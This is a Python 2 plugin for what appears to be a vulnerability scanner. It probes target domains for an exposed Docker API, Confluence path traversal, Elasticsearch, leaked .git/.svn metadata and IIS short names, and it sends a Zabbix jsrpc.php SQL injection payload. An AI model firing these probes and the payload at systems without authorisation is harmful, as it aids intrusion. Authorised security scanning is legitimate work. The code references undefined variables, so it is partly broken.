# coding:utf-8
import logging
import lib.requests as requests
import random
from lib.config import (
    PASSWORD_DIC, MY_PROXY, USER_AGENT_LIST
)
def exploit(ip):
    result = []
    weakfile = [
        ['/containers/json','HostConfig'],
        ['/spaces/viewdefaultdecorator.action?decoratorName=/','log4j.properties'],
        ['/_cat','/_cat/master'],
        ['/.git/config','repositoryformatversion'],
        ['/.svn/all-wcprops','svn:wc:ra_dav:version-url'],
        ['/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1+or+updatexml(1,md5(0x36),1)+or+1=1)%23&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17','c5a880faf6fb5e6087eb1b2dc'],
        ['/otua*~1.*/.aspx','400']
    ]
    if Domain:
        for domain in Domain:
            for i in weakfile:
                url = domain+i[0]
                try:
                    resp = requests.get(url, timeout=TIME_OUT, proxies=MY_PROXY, headers={"User-Agent": random.choice(USER_AGENT_LIST)}, allow_redirects=True, verify=False)
                except Exception,e:
                    logging.error(e)
                    continue
                if i[1].isdigit():
                    if resp.status_code == int(i[1]):
                        result.append('%s >>>> 存在弱点文件'%url)
                else:
                    if i[1] in resp.text:
                        result.append('%s >>>> 存在弱点文件'%url)
        if len(result):
            return result


